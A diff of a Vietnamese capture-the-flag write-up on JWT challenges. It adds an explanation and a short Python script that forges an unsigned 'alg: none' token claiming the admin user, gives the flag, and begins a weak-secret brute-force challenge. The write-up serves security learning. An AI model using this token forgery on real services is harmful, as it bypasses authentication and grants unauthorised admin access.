@@ -23,9 +23,29 @@ Ta có login form như sau
 
 Sửa thử username = admin thì server trả về lỗi: 
 
+![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)
 
-Thế thì để alg = none thôi: 
+
+
+Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.
 
 ![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)
 
 > flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
+
+```
+import base64
+import json
+
+header = {'typ':'JWT', 'alg':'none'}
+payload = {'username':'admin'}
+header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
+payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
+data = header_encoded +'.'+payload_encoded+'.'
+print(data)
+```
+
+## Chall 2: JSON Web Token (JWT) - Weak secret
+
+Dạng này thì là weak secret key, nghe đã biết phải brute force để tìm kiếm được secret key rồi.
+
